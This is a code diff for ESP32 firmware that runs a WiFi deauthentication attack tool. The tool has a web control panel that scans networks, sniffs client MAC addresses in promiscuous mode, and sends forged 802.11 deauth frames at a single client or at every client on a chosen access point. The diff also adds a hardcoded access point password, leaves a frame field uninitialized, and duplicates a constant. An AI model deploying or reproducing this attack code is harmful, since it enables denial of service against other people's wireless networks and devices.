@@ -14,10 +14,11 @@ void begin_attack(int net_index, int mode, uint16_t reason_code);
 void end_attack();
 
 // ================= 802.11 CONSTANTS =================
-#define TO_DS           0x01
-#define FROM_DS         0x02
+#define TO_DS   0x01
+#define FROM_DS 0x02
 #define MIN_PAYLOAD_LEN 26
-#define MIN_RSSI        -80
+#define MIN_RSSI -80
+#define MAX_CLIENTS 50
 
 // ================= CLIENT STORAGE =================
 #define MAX_CLIENTS 50
@@ -32,7 +33,7 @@ uint8_t my_ap_mac[6];
 // ================= SNIFF STATE =================
 bool is_sniffing = false;
 unsigned long sniff_start_time = 0;
-const unsigned long SNIFF_DURATION = 15000;
+const unsigned long SNIFF_DURATION = 30000;
 
 bool pending_sniff = false;
 unsigned long pending_sniff_time = 0;
@@ -47,7 +48,7 @@ uint8_t target_client[6];
 // ================= STRUCT (DEAUTH) =================
 typedef struct {
   uint8_t frame_control[2] = { 0xC0, 0x00 };
-  uint8_t duration[2] = { 0x3A, 0x01 };
+  uint8_t duration[2];
   uint8_t station[6];
   uint8_t sender[6];
   uint8_t access_point[6];
@@ -217,7 +218,7 @@ String macToString(const uint8_t *mac) {
   return String(buf);
 }
 
-void parseBytes(const char *str, char sep, byte *bytes, int maxBytes, int base) {
+void parseBytes(const char* str, char sep, byte* bytes, int maxBytes, int base) {
   for (int i = 0; i < maxBytes; i++) {
     bytes[i] = strtoul(str, NULL, base);
     str = strchr(str, sep);
@@ -234,9 +235,7 @@ void processPacket(const uint8_t *payload, uint16_t len, int8_t rssi) {
   uint8_t *addr2 = (uint8_t *)(payload + 10);
   uint8_t *addr3 = (uint8_t *)(payload + 16);
 
-  if (macEqual(addr1, my_ap_mac) ||
-      macEqual(addr2, my_ap_mac) ||
-      macEqual(addr3, my_ap_mac)) return;
+  if (macEqual(addr1, my_ap_mac) || macEqual(addr2, my_ap_mac) || macEqual(addr3, my_ap_mac)) return;
 
   uint8_t fc1 = payload[1];
   bool to_ds = fc1 & TO_DS;
@@ -245,9 +244,9 @@ void processPacket(const uint8_t *payload, uint16_t len, int8_t rssi) {
   uint8_t *client = nullptr;
   uint8_t *ap = nullptr;
 
-  if (to_ds && !from_ds) { client = addr2; ap = addr1; } 
-  else if (!to_ds && from_ds) { client = addr1; ap = addr2; } 
-  else if (!to_ds && !from_ds) { client = addr2; ap = addr3; } 
+  if (to_ds && !from_ds) { client = addr2; ap = addr1; }
+  else if (!to_ds && from_ds) { client = addr1; ap = addr2; }
+  else if (!to_ds && !from_ds) { client = addr2; ap = addr3; }
   else return;
 
   if (!macEqual(ap, target_bssid)) return;
@@ -264,8 +263,9 @@ void processPacket(const uint8_t *payload, uint16_t len, int8_t rssi) {
   }
 }
 
-void sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (!is_sniffing || type != WIFI_PKT_DATA) return;
+
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
   processPacket(pkt->payload, pkt->rx_ctrl.sig_len, pkt->rx_ctrl.rssi);
 }
@@ -396,6 +396,7 @@ void setup() {
   Serial.begin(115200);
 
   WiFi.mode(WIFI_AP_STA);
+
   WiFi.setSleep(false);
   esp_wifi_set_ps(WIFI_PS_NONE);
 
@@ -416,84 +417,58 @@ void setup() {
   // --- ROUTES ---
   server.on("/", []() { server.send(200, "text/html", index_html); });
 
-  server.on("/scan", []() {
-    int n = WiFi.scanNetworks();
-    String json = "[";
-    for (int i = 0; i < n; i++) {
-      if (i) json += ",";
-      json += "{\"ssid\":\"" + WiFi.SSID(i) +
-              "\",\"mac\":\"" + WiFi.BSSIDstr(i) +
-              "\",\"ch\":" + String(WiFi.channel(i)) +
-              ",\"rssi\":" + String(WiFi.RSSI(i)) + "}";
+  server.on("/scan", [](){
+    int n=WiFi.scanNetworks();
+    String json="[";
+    for(int i=0;i<n;i++){
+      if(i) json+=",";
+      json+="{\"ssid\":\""+WiFi.SSID(i)+"\",\"mac\":\""+WiFi.BSSIDstr(i)+"\",\"ch\":"+String(WiFi.channel(i))+",\"rssi\":"+String(WiFi.RSSI(i))+"}";
     }
-    json += "]";
-    WiFi.scanDelete();
-    server.send(200, "application/json", json);
+    json+="]";
+    server.send(200,"application/json",json);
   });
 
-  server.on("/start_sniff", []() {
+  server.on("/start_sniff", [](){
     parseBytes(server.arg("mac").c_str(), ':', target_bssid, 6, 16);
-    pending_ch = server.arg("ch").toInt();
-    target_ssid_name = server.arg("ssid");
-
-    attack_running = false;
-    attack_initialized = false;
-    is_beaconing = false;
-
-    pending_sniff = true;
-    pending_sniff_time = millis();
-
-    server.send(200, "text/plain", "OK");
+    pending_ch=server.arg("ch").toInt();
+    target_ssid_name=server.arg("ssid");
+    pending_sniff=true;
+    pending_sniff_time=millis();
+    server.send(200,"text/plain","OK");
   });
 
-  server.on("/get_clients", []() {
-    String json = "{\"clients\":[";
-    for (int i = 0; i < client_count; i++) {
-      if (i) json += ",";
-      json += "\"" + macToString(discovered_clients[i]) + "\"";
+  server.on("/get_clients", [](){
+    String json="{\"clients\":[";
+    for(int i=0;i<client_count;i++){
+      if(i) json+=",";
+      json+="\""+macToString(discovered_clients[i])+"\"";
     }
-    json += "]}";
-    server.send(200, "application/json", json);
+    json+="]}";
+    server.send(200,"application/json",json);
   });
 
-  server.on("/deauth_client", []() {
+  server.on("/deauth_client", [](){
     parseBytes(server.arg("mac").c_str(), ':', target_client, 6, 16);
-    is_beaconing = false;
-    if (is_sniffing) {
-        is_sniffing = false;
-        esp_wifi_set_promiscuous(false);
-    }
-
-    attack_running = true;
-    attack_all = false;
-    attack_initialized = false;
-
-    server.send(200, "text/plain", "STARTED");
+    attack_running=true;
+    attack_all=false;
+    attack_initialized=false;
+    server.send(200,"text/plain","STARTED");
   });
 
-  server.on("/deauth_all", []() {
-    is_beaconing = false;
-    if (is_sniffing) {
-        is_sniffing = false;
-        esp_wifi_set_promiscuous(false);
-    }
-
-    attack_running = true;
-    attack_all = true;
-    attack_initialized = false;
-
-    server.send(200, "text/plain", "STARTED");
+  server.on("/deauth_all", [](){
+    attack_running=true;
+    attack_all=true;
+    attack_initialized=false;
+    server.send(200,"text/plain","STARTED");
   });
 
-  server.on("/stop_deauth", []() {
+  server.on("/stop_deauth", [](){
     attack_running = false;
     attack_initialized = false;
-    if (is_sniffing) {
-        is_sniffing = false;
-        esp_wifi_set_promiscuous(false);
-    }
+    is_sniffing = false;
 
     end_attack();
+
     server.send(200, "text/plain", "STOPPED");
   });
 
@@ -531,7 +506,7 @@ void loop() {
   if (pending_sniff && millis() - pending_sniff_time > 1000) {
     pending_sniff = false;
     esp_wifi_set_promiscuous(false);
-    
+    WiFi.softAP("ESP32_Tactical","mgmtadmin",pending_ch); 
     esp_wifi_set_channel(pending_ch, WIFI_SECOND_CHAN_NONE);
     client_count = 0;
 
@@ -548,22 +523,21 @@ void loop() {
   }
 
   // SNIFF TIMEOUT
-  if (is_sniffing && millis() - sniff_start_time > SNIFF_DURATION) {
-    is_sniffing = false;
+  if (is_sniffing && millis()-sniff_start_time>SNIFF_DURATION) {
+    is_sniffing=false;
     esp_wifi_set_promiscuous(false);
   }
 
   // ACTIVE DEAUTH - 100% untouched
-  if (attack_running && !attack_initialized) {
-    begin_attack(
-      0,
-      attack_all ? DEAUTH_ALL : DEAUTH_SINGLE,
-      0x0007
-    );
+  if (attack_running) {
+
+  if (!attack_initialized) {
+    begin_attack(0, attack_all ? DEAUTH_ALL : DEAUTH_SINGLE, 0x0007);
     attack_initialized = true;
   }
 
-  if (attack_running && !attack_all) {
+  if (!attack_all) {
+
     deauth_frame_t deauth_frame = {};
     deauth_frame.reason = 0x0007;
 
@@ -572,14 +546,14 @@ void loop() {
     memcpy(deauth_frame.access_point, target_bssid, 6);
 
     esp_wifi_80211_tx(
-      WIFI_IF_AP, 
-      &deauth_frame, 
-      sizeof(deauth_frame), 
+      WIFI_IF_AP,
+      &deauth_frame,
+      sizeof(deauth_frame),
       false
     );
 
     delay(75);
-  }
+  }}
 
   if (!attack_running) {
     attack_initialized = false;
